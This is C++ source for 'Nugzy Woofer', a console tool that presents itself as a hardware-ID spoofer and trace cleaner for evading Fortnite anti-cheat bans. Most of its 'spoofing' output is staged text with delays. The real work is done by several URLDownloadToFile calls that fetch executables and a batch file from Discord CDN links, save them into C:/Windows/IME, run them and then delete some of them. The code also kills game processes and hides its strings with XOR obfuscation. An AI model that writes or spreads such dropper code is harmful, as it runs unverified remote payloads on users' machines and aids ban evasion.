

#include <iostream>
#include <Windows.h>
#include <ios>
#include <limits>
#include <stdio.h>
#include <time.h>
#include <conio.h>
#include <sstream>
#include <string>
#include <urlmon.h>
#include <tchar.h>
#include "xor.hpp"
#include<string.h>
#include<stdlib.h>
#include<conio.h>
#include<cstdint>
#pragma comment (lib, "urlmon.lib")
 
//developed by Nugzy#5731

void Woof()
{

    system("cls");

    SetConsoleTitleA("Nugzy Woofer");

    system("color B");

    std::cout << _xor_("\n\n      Spoofing You Computer...") << "\n";

    Sleep(3500);

    system("cls");

    std::cout << _xor_("\n\n    Spoofing You Baseboard SerialNumber...") << "\n";

    Sleep(1500);

    system("cls");

    std::cout << _xor_("\n\n    Spoofing You Bios SerialNumber...") << "\n";

    Sleep(1500);

    system("cls");


    std::cout << _xor_("\n\n    Spoofing You Cpu SerialNumber...") << "\n";

    Sleep(1500);

    system("cls");


    std::cout << _xor_("\n\n    Spoofing You Bios Uuid...") << "\n";

    Sleep(1500);

    system("cls");


    std::cout << _xor_("\n\n    Spoofing You Diskdrive SerialNumber...") << "\n";
    system("cls");

    std::cout << _xor_("\n\n    Old Hwid :\n\n") << "\n";

    system("    wmic diskdrive get serialnumber");

    Sleep(7500);

    system("cls");



    HRESULT a = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/813779903208095784/904085162621538304/spoofer.exe"), _T("C:/Windows/IME/spoofer.exe"), 0, NULL);


    system("start C://Windows//IME//spoofer.exe");

    Sleep(100);

    std::cout << _xor_("\n\n    New Hwid :\n\n") << "\n";

    system("    wmic diskdrive get serialnumber");

    Sleep(100);


    system("cls");


    std::cout << _xor_("\n\n    Spoofing You Baseboard Uuid...") << "\n";

    Sleep(1500);

    system("cls");


    std::cout << _xor_("\n\n    Spoofing You Ram SerialNumber...") << "\n";

    Sleep(1500);

    system("cls");


    std::cout << _xor_("\n\n    Spoofing You Cpu ProcessorId...") << "\n";

    Sleep(1500);

    system("cls");

    std::cout << _xor_("\n\n    You Pc Is Spoofing By Nugzy Woofer...") << "\n";

    Sleep(7500);
}



void Trace()
{

    system("cls");

    SetConsoleTitleA("Nugzy Woofer And Cleaner");

    system("color B");


    std::cout << _xor_("\n\n      Cleaning You Tracking File...") << "\n";
    std::cout << _xor_("\n\nDO NOT RESET ADAPTERS");

    HRESULT a = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/739807832865767495/764472006657572904/cleaner_protected.exe"), _T("C:/Windows/IME/cleaner_protected.exe"), 0, NULL);
    system("start C:/Windows/IME/cleaner_protected.exe");

    Sleep(1500);

    system("taskkill /f /im cmd.exe >nul 2>&1");

    remove("C://Windows//IME//cleaner_protected.exe");

}



void helpMenu() {


    system("cls");
    SetConsoleTitleA("Nugzy Help Menu");
    std::cout << _xor_("\n\n\tHelp Menu");
    std::cout << _xor_("\n\n-HOW TO UNBAN CORRECTLY");
    std::cout << _xor_("\n\n1-Run the cleaner and wait for it to finish");
    std::cout << _xor_("\n\nRestart your pc");
    std::cout << _xor_("\n\nAfter reboot run again the cleaner");
    std::cout << _xor_("\n\nRun the spoofer and make sure your hwid changed");
    std::cout << _xor_("\n\nCreate a new Epicgames Account");
    std::cout << _xor_("\n\nIf you still getting kicked just use a VPN");
    system("pause");



}
void EACFORCER() {

    system("cls");
    std::cout << _xor_("\n\nFORCING EAC...");
    HRESULT a = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/813779903208095784/904801090850136104/EACForc3r.bat"), _T("C:/Windows/IME/EACForc3r.bat"), 0, NULL);
    system("start C:/Windows/IME/EACForc3r.bat");

    Sleep(1500);

    remove("C://Windows//IME//EACForc3r.bat");

    system("pause");




}

bool dumb = false;
int disclink = 0;

int main()
{
    system("cls");
    std::string selector;
    //killing shit from epic
    system("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1");
    system("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1");

    SetConsoleTitleA("Nugzy Cleaner and Woofer");
    //just run discord once , dont be annoying af
    if (disclink == 0) {
        system("start https://discord.gg/bYEB3kAYEp");
        disclink++;
    }
    //remove the value of selector
    selector.clear();
    std::cout << _xor_("\n\n      Welcome To Nugzy Woofer") << "\n";
    std::cout << _xor_("\n\n      (CURRENTLY ONLY WORKING FOR FORTNITE)") << "\n";
    std::cout << _xor_("\n\t      Select what you wanna do");
    std::cout << _xor_("\n\n      1)Spoof");
    std::cout << _xor_("\n\n      2)Clean");
    std::cout << _xor_("\n\n      3)[NEW]Help");
    std::cout << _xor_("\n\n      4)[NEW]EAC FORCER");

    //if u have parkinson
    if (dumb == true) {

        std::cout << _xor_("\n\n     Not a valid Number bruh");
        dumb = false;

    }
    std::cout << _xor_("\n\n      Enter your number: ");getline(std::cin, selector);
    if (selector == "1") {

        Woof();
        return(main());

    }
    else if (selector == "2") {

        Trace();
        return(main());

    }
   // else if (selector == "3") {

       // system("cls");
        //std::cout << _xor_("\n\n     Serials:");

   // }
    else if (selector == "3") {

        helpMenu();
        return(main());

    }
    else if (selector == "4") {

        EACFORCER();
        return(main());

    }
    else {

        dumb = true;
        return(main());

    }

}

